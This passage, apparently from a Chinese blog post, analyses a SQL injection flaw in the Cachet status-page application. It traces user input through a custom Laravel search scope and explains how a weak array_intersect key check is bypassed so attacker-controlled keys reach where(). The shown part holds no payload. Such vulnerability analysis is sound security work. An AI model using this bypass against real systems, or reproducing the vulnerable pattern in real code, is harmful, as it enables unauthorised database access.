+</span></span><span class=line><span class=cl>            <span class=nv>$direction</span> <span class=o>=</span> <span class=nx>Binput</span><span class=o>::</span><span class=na>has</span><span class=p>(</span><span class=s1>&#39;order&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>Binput</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;order&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;desc&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nv>$components</span><span class=o>-&gt;</span><span class=na>sort</span><span class=p>(</span><span class=nv>$sortBy</span><span class=p>,</span> <span class=nv>$direction</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$components</span> <span class=o>=</span> <span class=nv>$components</span><span class=o>-&gt;</span><span class=na>paginate</span><span class=p>(</span><span class=nx>Binput</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;per_page&#39;</span><span class=p>,</span> <span class=mi>20</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>paginator</span><span class=p>(</span><span class=nv>$components</span><span class=p>,</span> <span class=nx>Request</span><span class=o>::</span><span class=na>instance</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里有一个点需要关注：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$components</span><span class=o>-&gt;</span><span class=na>search</span><span class=p>(</span><span class=nx>Binput</span><span class=o>::</span><span class=na>except</span><span class=p>([</span><span class=s1>&#39;sort&#39;</span><span class=p>,</span> <span class=s1>&#39;order&#39;</span><span class=p>,</span> <span class=s1>&#39;per_page&#39;</span><span class=p>]));</span>
+</span></span><span class=line><span class=cl><span class=nv>$components</span><span class=o>-&gt;</span><span class=na>sort</span><span class=p>(</span><span class=nv>$sortBy</span><span class=p>,</span> <span class=nv>$direction</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>sort和search方法都不是Laravel自带的Model方法，其实目前来说各个web框架的ORM都很难存在SQL注入的相关漏洞，但是往往这种自定义的方法，因为开发者的大意而存在漏洞。
+sort和search方法就是自定义的scope，scope是定义在Model中可以被重用的方法，他们都以scope开头，可以在 <code>app/Models/Traits</code>目录下找到，如存在漏洞的 <code>SearchableTrait</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>trait</span> <span class=nx>SearchableTrait</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd>     * Adds a search scope.
+</span></span></span><span class=line><span class=cl><span class=sd>     *
+</span></span></span><span class=line><span class=cl><span class=sd>     * @param \Illuminate\Database\Eloquent\Builder $query
+</span></span></span><span class=line><span class=cl><span class=sd>     * @param array                                 $search
+</span></span></span><span class=line><span class=cl><span class=sd>     *
+</span></span></span><span class=line><span class=cl><span class=sd>     * @return \Illuminate\Database\Eloquent\Builder
+</span></span></span><span class=line><span class=cl><span class=sd>     */</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>scopeSearch</span><span class=p>(</span><span class=nx>Builder</span> <span class=nv>$query</span><span class=p>,</span> <span class=k>array</span> <span class=nv>$search</span> <span class=o>=</span> <span class=p>[])</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$search</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$query</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>array_intersect</span><span class=p>(</span><span class=nx>array_keys</span><span class=p>(</span><span class=nv>$search</span><span class=p>),</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>searchable</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$query</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>(</span><span class=nv>$search</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Cachet在调用search时传入的是<code>Binput::except(['sort', 'order', 'per_page'])</code>，这个返回值是将用户完整的输入除掉<code>sort</code>、<code>order</code>、<code>per_page</code>三个key组成的数组。也就是说，传入<code>scopeSearch</code>的这个<code>$search</code>数组的键、值都是用户可控的。
+在这段代码中存在一个判断：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>array_intersect</span><span class=p>(</span><span class=nx>array_keys</span><span class=p>(</span><span class=nv>$search</span><span class=p>),</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>searchable</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$query</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>array_intersect</code>这个函数，他的功能是计算两个输入数组的交集这个判断其实是比较好绕过的，输入中数组中只要有一个key在<code>$this->searchable</code>中就可以绕过，我们输入的数组<code>$search</code> 就可以完整的传入到 <code>where</code>条件中。</p><p>这里需要知道 <code>Laraverl</code> 的<code>where</code>的用法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>DB</span><span class=o>::</span><span class=na>table</span><span class=p>(</span><span class=s1>&#39;dual&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>// 生成的WHERE条件是：WHERE id = v
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>DB</span><span class=o>::</span><span class=na>table</span><span class=p>(</span><span class=s1>&#39;dual&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>// 生成的WHERE条件是：WHERE id &gt; 18
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=nx>DB</span><span class=o>::</span><span class=na>table</span><span class=p>(</span><span class=s1>&#39;dual&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>([</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;18&#39;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>,</span> <span class=s1>&#39;LIKE&#39;</span><span class=p>,</span> <span class=s1>&#39;%example%&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=c1>// 生成的WHERE条件是：WHERE id &gt; 18 AND title LIKE &#39;%example%&#39;
+</span></span></span></code></pre></td></tr></table></div></div><p>通过Debug的方式看Where的逻辑：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd> * Add a basic where clause to the query.
+</span></span></span><span class=line><span class=cl><span class=sd> *
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  string  $column
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  string  $operator
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  mixed   $value
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  string  $boolean
+</span></span></span><span class=line><span class=cl><span class=sd> * @return $this
+</span></span></span><span class=line><span class=cl><span class=sd> */</span>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>where</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$operator</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$value</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$boolean</span> <span class=o>=</span> <span class=s1>&#39;and&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$column</span> <span class=nx>instanceof</span> <span class=nx>Closure</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$query</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>model</span><span class=o>-&gt;</span><span class=na>newQueryWithoutScopes</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$query</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>query</span><span class=o>-&gt;</span><span class=na>addNestedWhereQuery</span><span class=p>(</span><span class=nv>$query</span><span class=o>-&gt;</span><span class=na>getQuery</span><span class=p>(),</span> <span class=nv>$boolean</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>call_user_func_array</span><span class=p>([</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>,</span> <span class=s1>&#39;where&#39;</span><span class=p>],</span> <span class=nx>func_get_args</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$this</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>接着跟进，代码会执行到：<code>src/Illuminate/Database/Query/Builder.php</code>，
+当第一个参数是数组时，将会执行到addArrayOfWheres()方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd>* Add a basic where clause to the query.
+</span></span></span><span class=line><span class=cl><span class=sd>*
+</span></span></span><span class=line><span class=cl><span class=sd>* @param  string|array|\Closure  $column
+</span></span></span><span class=line><span class=cl><span class=sd>* @param  string  $operator
+</span></span></span><span class=line><span class=cl><span class=sd>* @param  mixed   $value
+</span></span></span><span class=line><span class=cl><span class=sd>* @param  string  $boolean
+</span></span></span><span class=line><span class=cl><span class=sd>* @return $this
+</span></span></span><span class=line><span class=cl><span class=sd>*
+</span></span></span><span class=line><span class=cl><span class=sd>* @throws \InvalidArgumentException
+</span></span></span><span class=line><span class=cl><span class=sd>*/</span>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>where</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$operator</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$value</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$boolean</span> <span class=o>=</span> <span class=s1>&#39;and&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// If the column is an array, we will assume it is an array of key-value pairs
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// and can add them each as a where clause. We will maintain the boolean we
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// received when the method was called and pass it into the nested where.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$column</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>addArrayOfWheres</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$boolean</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Here we will make some assumptions about the operator. If only 2 values are
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// passed to the method, we will assume that the operator is an equals sign
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// and keep going. Otherwise, we&#39;ll require the operator to be passed in.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>func_num_args</span><span class=p>()</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>list</span><span class=p>(</span><span class=nv>$value</span><span class=p>,</span> <span class=nv>$operator</span><span class=p>)</span> <span class=o>=</span> <span class=p>[</span><span class=nv>$operator</span><span class=p>,</span> <span class=s1>&#39;=&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>invalidOperatorAndValue</span><span class=p>(</span><span class=nv>$operator</span><span class=p>,</span> <span class=nv>$value</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nx>InvalidArgumentException</span><span class=p>(</span><span class=s1>&#39;Illegal operator and value combination.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// If the columns is actually a Closure instance, we will assume the developer
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// wants to begin a nested where statement which is wrapped in parenthesis.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We&#39;ll add that Closure to the query then return back out immediately.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nv>$column</span> <span class=nx>instanceof</span> <span class=nx>Closure</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>whereNested</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$boolean</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// If the given operator is not found in the list of valid operators we will
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// assume that the developer is just short-cutting the &#39;=&#39; operators and
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we will set the operators to &#39;=&#39; and set the values appropriately.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span> <span class=nx>in_array</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nv>$operator</span><span class=p>),</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>operators</span><span class=p>,</span> <span class=k>true</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>        <span class=o>!</span> <span class=nx>in_array</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nv>$operator</span><span class=p>),</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>grammar</span><span class=o>-&gt;</span><span class=na>getOperators</span><span class=p>(),</span> <span class=k>true</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>list</span><span class=p>(</span><span class=nv>$value</span><span class=p>,</span> <span class=nv>$operator</span><span class=p>)</span> <span class=o>=</span> <span class=p>[</span><span class=nv>$operator</span><span class=p>,</span> <span class=s1>&#39;=&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// If the value is a Closure, it means the developer is performing an entire
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// sub-select within the query and we will need to compile the sub-select
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// within the where clause to get the appropriate query record results.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nv>$value</span> <span class=nx>instanceof</span> <span class=nx>Closure</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>whereSub</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$operator</span><span class=p>,</span> <span class=nv>$value</span><span class=p>,</span> <span class=nv>$boolean</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// If the value is &#34;null&#34;, we will just assume the developer wants to add a
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// where null clause to the query. So, we will allow a short-cut here to
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// that method for convenience so the developer doesn&#39;t have to check.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$value</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>whereNull</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$boolean</span><span class=p>,</span> <span class=nv>$operator</span> <span class=o>!=</span> <span class=s1>&#39;=&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Now that we are working with just a simple query we can put the elements
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// in our array and add the query binding to our array of bindings that
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// will be bound to each SQL statements when it is finally executed.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$type</span> <span class=o>=</span> <span class=s1>&#39;Basic&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>Str</span><span class=o>::</span><span class=na>contains</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=s1>&#39;-&gt;&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>is_bool</span><span class=p>(</span><span class=nv>$value</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$value</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Expression</span><span class=p>(</span><span class=nv>$value</span> <span class=o>?</span> <span class=s1>&#39;true&#39;</span> <span class=o>:</span> <span class=s1>&#39;false&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>wheres</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>compact</span><span class=p>(</span><span class=s1>&#39;type&#39;</span><span class=p>,</span> <span class=s1>&#39;column&#39;</span><span class=p>,</span> <span class=s1>&#39;operator&#39;</span><span class=p>,</span> <span class=s1>&#39;value&#39;</span><span class=p>,</span> <span class=s1>&#39;boolean&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span> <span class=nv>$value</span> <span class=nx>instanceof</span> <span class=nx>Expression</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>addBinding</span><span class=p>(</span><span class=nv>$value</span><span class=p>,</span> <span class=s1>&#39;where&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$this</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>接着跟进，带执行到如下代码，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd> * Add an array of where clauses to the query.
+</span></span></span><span class=line><span class=cl><span class=sd> *
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  array  $column
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  string  $boolean
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  string  $method
+</span></span></span><span class=line><span class=cl><span class=sd> * @return $this
+</span></span></span><span class=line><span class=cl><span class=sd> */</span>
+</span></span><span class=line><span class=cl><span class=k>protected</span> <span class=k>function</span> <span class=nf>addArrayOfWheres</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$boolean</span><span class=p>,</span> <span class=nv>$method</span> <span class=o>=</span> <span class=s1>&#39;where&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>whereNested</span><span class=p>(</span><span class=k>function</span> <span class=p>(</span><span class=nv>$query</span><span class=p>)</span> <span class=k>use</span> <span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$method</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$column</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$key</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$value</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>call_user_func_array</span><span class=p>([</span><span class=nv>$query</span><span class=p>,</span> <span class=nv>$method</span><span class=p>],</span> <span class=nv>$value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$query</span><span class=o>-&gt;</span><span class=nv>$method</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=nv>$value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=nv>$boolean</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sd>/**
